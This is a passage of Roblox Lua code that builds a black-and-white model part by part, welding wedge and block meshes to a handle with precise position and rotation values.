Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.0280609131, -0.343752861, 7.90654612, 1, -1.50987177e-007, -1.48376117e-007, 1.45735555e-007, 0.999390841, -0.0348992646, 1.53523487e-007, 0.0348992646, 0.999390841))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0166666452, 0.0999999568, 0.366666645))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0.00332832336, -0.0296730995, 2.22566557, -1, -8.61177796e-012, 1.51011747e-007, -8.85193828e-012, -0.99999994, -1.19207961e-007, 1.50979517e-007, -1.19210625e-007, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0833333209, 0.0499999858, 0.400000006))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-2.05584478, 0, 0.0412130356, -1.07268136e-007, 1.33582034e-012, -1, -1, -8.61438351e-012, 1.07300366e-007, 8.83393966e-012, 1, -1.33582034e-012))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.116666652, 0.0499999858, 0.166666672))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-1.90734863e-006, -0.0824308395, -2.25369406, 1, 1.51004386e-007, -1.51011733e-007, 1.50986963e-007, -1, 5.96059806e-008, -1.50979531e-007, -5.9603309e-008, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0666666552, 0.0666666552, 0.433333367))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-2.00435209, 0, 0.380025864, -1.02121355e-007, 0.258818984, -0.965925753, -1, 1.13047181e-008, 1.08789791e-007, 3.9084906e-008, 0.965925753, 0.258818984))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999933, 0.0999999866))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0.028055191, -0.067609787, -2.28172255, -1, -8.61177796e-012, 1.51011747e-007, 8.83204621e-012, 1, -5.96059806e-008, -1.50979531e-007, -5.9603309e-008, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0666666478, 0.0499999858, 0.400000006))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-1.06898212, -0.0280532837, -1.0689826, -6.30410142e-008, 0.70710665, -0.707106829, 1, -3.09000008e-008, -1.20103124e-007, -1.0676488e-007, -0.707106829, -0.70710665))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.133333325, 0.166666672, 0.133333325))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-2.05584478, 0.0280532837, 0.0412135124, -1.07268143e-007, 1.19210625e-007, -0.99999994, -1, -8.60727808e-012, 1.07300366e-007, 8.85193828e-012, 0.99999994, 1.19207961e-007))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.166666672))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.26282072, -0.028055191, 0.412180901, 1.94690912e-007, -1.32871492e-012, 1, 1, 8.62338326e-012, -1.94723142e-007, 8.83393966e-012, 1, -1.33582034e-012))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0833333209, 0.166666672, 0.333333343))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.028055191, -0.0692405701, -2.28172255, 1, 1.51004386e-007, -1.51011733e-007, 1.50986963e-007, -1, 5.96059806e-008, -1.50979531e-007, -5.9603309e-008, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0666666478, 0.0499999858, 0.400000006))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0.00164985657, 0, -1.62058592, 4.37202203e-008, 1, -5.96059806e-008, 1, -4.37027694e-008, -1.51011719e-007, -1.50979531e-007, -5.9603309e-008, -1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.116666652, 0.166666672, 0.333333343))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.90734863e-006, -0.0824422836, -2.25369406, -1, -8.61177796e-012, 1.51011747e-007, 8.83204621e-012, 1, -5.96059806e-008, -1.50979531e-007, -5.9603309e-008, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0666666552, 0.0666666552, 0.433333367))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0.00164985657, -0.0280532837, -1.62058592, 4.37202203e-008, 1, -5.96059806e-008, 1, -4.37027694e-008, -1.51011719e-007, -1.50979531e-007, -5.9603309e-008, -1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0833333209, 0.166666672, 0.333333343))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.0296878815, -0.0296740532, 2.22566557, 1, -1.50987148e-007, -1.51011761e-007, 1.51004627e-007, 0.99999994, 1.19207968e-007, 1.50979517e-007, -1.19210625e-007, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0666666478, 0.0499999858, 0.400000006))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0.336278915, 0.028055191, -2.42486453, 5.68613316e-008, -0.99619472, 0.0871558189, -1, -4.35536691e-008, 1.5482145e-007, -1.50405796e-007, -0.0871558189, -0.99619472))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.399999976))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-2.00435209, 0.0280532837, 0.380025864, -1.02121355e-007, 0.258818984, -0.965925753, -1, 1.13047181e-008, 1.08789791e-007, 3.9084906e-008, 0.965925753, 0.258818984))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0833333209, 0.0499999858, 0.0999999866))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-1.64256334, 0.0280532837, -1.02001858, -6.30534984e-008, -0.707106829, -0.70710665, -1, -3.0917235e-008, 1.20103138e-007, -1.06752402e-007, 0.70710665, -0.707106829))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.166666672))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.06781673, -1.90734863e-006, -1.06781578, 1.50476268e-007, 0.707106829, 0.70710665, 1, -3.09000008e-008, -1.81920356e-007, -1.06752402e-007, 0.70710665, -0.707106829))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.166666672, 0.166666672, 0.166666672))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0.342236519, 1.90734863e-006, -2.34159303, 5.68613316e-008, -0.99619472, 0.0871558189, -1, -4.35536691e-008, 1.5482145e-007, -1.50405796e-007, -0.0871558189, -0.99619472))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.116666652, 0.0499999858, 0.5))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-1.85855484, 0, 0.747494459, -8.70362982e-008, 0.5, -0.866025448, -1, 2.1847077e-008, 1.13156574e-007, 7.54974323e-008, 0.866025329, 0.5))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999933, 0.0999999866))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.3308568, 0.028055191, -2.3442421, 3.05438768e-008, -0.996194661, -0.0871556103, -1, -4.35536585e-008, 1.47202044e-007, -1.50404233e-007, 0.0871556103, -0.996194661))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.5))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.06806135, 0.028055191, -1.80671334, 1.07510097e-007, -0.906307697, 0.422618389, -1, -3.96245774e-008, 1.69484991e-007, -1.36837642e-007, -0.422618389, -0.906307697))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.0999999866))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.06806087, 1.90734863e-006, -1.80671358, 1.0751009e-007, -0.906307757, 0.4226183, -1, -3.96245774e-008, 1.69484991e-007, -1.36837684e-007, -0.4226183, -0.906307757))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.116666652, 0.0499999858, 0.116666652))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0.00164985657, 0.0280227661, -1.62058592, 4.37202203e-008, 1, -5.96059806e-008, 1, -4.37027694e-008, -1.51011719e-007, -1.50979531e-007, -5.9603309e-008, -1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0833333209, 0.166666672, 0.333333343))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.893769741, 0.0280532837, -1.85133171, 4.62648941e-009, -0.965925753, -0.258818984, -1, -4.2230571e-008, 1.39698415e-007, -1.45832772e-007, 0.258818984, -0.965925753))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.0999999866))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0, -0.028055191, -2.40537596, 4.37202203e-008, 1, -5.96059806e-008, 1, -4.37027694e-008, -1.51011719e-007, -1.50979531e-007, -5.9603309e-008, -1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0666666552, 0.166666672, 0.25000003))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0.0280609131, 0.179037094, 7.9139514, -1, -8.61177796e-012, 1.51011747e-007, 5.26024646e-009, -0.999390841, 0.0348992646, 1.50887871e-007, 0.0348992646, 0.999390841))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0166666452, 0.0999999568, 0.366666645))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-1.85855484, 0.0280532837, 0.747494459, -8.70362982e-008, 0.5, -0.866025448, -1, 2.1847077e-008, 1.13156574e-007, 7.54974323e-008, 0.866025329, 0.5))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0833333209, 0.0499999858, 0.0999999866))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 4.94615555))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.00164794922, 0.0280609131, -5.16695738, 4.37025598e-008, -1, 5.96059806e-008, -1, -4.37200036e-008, 1.51011761e-007, -1.50979531e-007, -5.9603309e-008, -1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.199999973, 0.0666666552, 1))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-1.06781483, 0.0280227661, -1.06781673, -6.30410142e-008, 0.70710665, -0.707106829, 1, -3.09000008e-008, -1.20103124e-007, -1.0676488e-007, -0.707106829, -0.70710665))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.133333325, 0.166666672, 0.133333325))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-2.00435209, -0.0280227661, 0.380025864, -1.02121355e-007, 0.258818984, -0.965925753, -1, 1.13047181e-008, 1.08789791e-007, 3.9084906e-008, 0.965925753, 0.258818984))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0833333209, 0.0499999858, 0.0999999866))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.26282072, 0.0280208588, 0.412180901, 1.94690912e-007, -1.32871492e-012, 1, 1, 8.62338326e-012, -1.94723142e-007, 8.83393966e-012, 1, -1.33582034e-012))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0833333209, 0.166666672, 0.333333343))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(7.62939453e-006, -0.110453606, 7.9681406, -1, -8.61177796e-012, 1.51011747e-007, -8.85193828e-012, -0.99999994, -1.19207961e-007, 1.50979517e-007, -1.19210625e-007, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0166666452, 0.0999999568, 0.433333308))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.90734863e-006, -0.0412135124, 2.25369406, -1, -8.61177796e-012, 1.51011747e-007, -8.85193828e-012, -0.99999994, -1.19207961e-007, 1.50979517e-007, -1.19210625e-007, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0666666552, 0.0666666552, 0.433333367))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0.336278439, -0.0280208588, -2.42486453, 5.68613174e-008, -0.996194839, 0.0871557593, -1, -4.35536691e-008, 1.5482145e-007, -1.50405782e-007, -0.0871557593, -0.996194839))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.399999976))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0, 0.0280208588, -2.40537596, 4.37202203e-008, 1, -5.96059806e-008, 1, -4.37027694e-008, -1.51011719e-007, -1.50979531e-007, -5.9603309e-008, -1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0666666552, 0.166666672, 0.25000003))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.0247306824, -0.0296730995, 2.22566557, -1, -8.61177796e-012, 1.51011747e-007, -8.85193828e-012, -0.99999994, -1.19207961e-007, 1.50979517e-007, -1.19210625e-007, 0.99999994))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0666666478, 0.0499999858, 0.400000006))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 4.94615555))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.00164794922, -0.0280151367, -5.16695738, 4.37025598e-008, -1, 5.96059806e-008, -1, -4.37200036e-008, 1.51011761e-007, -1.50979531e-007, -5.9603309e-008, -1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.199999973, 0.0666666552, 1))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0.0280151367, -0.343983173, 7.91313314, 1, 8.61177796e-012, -1.51011747e-007, -5.26024646e-009, 0.999390841, -0.0348992646, 1.50887871e-007, 0.0348992646, 0.999390841))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0166666452, 0.0999999568, 0.366666645))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-2.05584478, -0.0280227661, 0.0412130356, -1.07268136e-007, 1.33582034e-012, -1, -1, -8.61438351e-012, 1.07300366e-007, 8.83393966e-012, 1, -1.33582034e-012))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.166666672))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.0280151367, 0.179037094, 7.9139514, -1, -8.61177796e-012, 1.51011747e-007, 5.26024646e-009, -0.999390841, 0.0348992646, 1.50887871e-007, 0.0348992646, 0.999390841))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0166666452, 0.0999999568, 0.366666645))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.06806135, -0.0280208588, -1.80671334, 1.07510097e-007, -0.906307697, 0.422618389, -1, -3.96245774e-008, 1.69484991e-007, -1.36837642e-007, -0.422618389, -0.906307697))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.0999999866))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-1.92918491, -0.0280227661, -0.610360622, -9.31263031e-008, -0.42261833, -0.906307817, -1, -1.84818436e-008, 1.11395778e-007, -6.37986943e-008, 0.906307817, -0.42261833))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.0999999866, 0.0499999858, 0.166666672))
Part=part(Enum.FormFactor.Symmetric,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 1.64871836, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0.0280208588, -0.0692405701, -2.28172255, 1, 8.74313955e-008, -1.51011761e-007, 8.74139445e-008, -1, 5.96059806e-008, -1.50979531e-007, -5.9603309e-008, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0666666478, 0.0499999858, 0.400000006))
